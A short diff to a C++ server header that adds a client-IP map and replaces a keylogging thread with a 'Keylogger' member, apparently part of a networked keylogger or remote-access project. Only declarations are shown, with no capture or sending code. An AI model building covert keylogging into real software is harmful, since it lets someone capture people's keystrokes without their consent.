@@ -5,6 +5,8 @@
 #include "../Message/Request.h"
 #include "../Message/Response.h"
 #include <thread>
+#include "helper.h"
+#include <map>
 #define BACKLOG 10
 
 class Server {
@@ -12,7 +14,8 @@ private:
     int listener;
     int disfd;
     std::vector<pollfd> pfds;
-    std::thread keylogThread;
+    std::map<int, std::string> _clientIP;
+    Keylogger _keylogger;
 public:
     Server();
     ~Server();
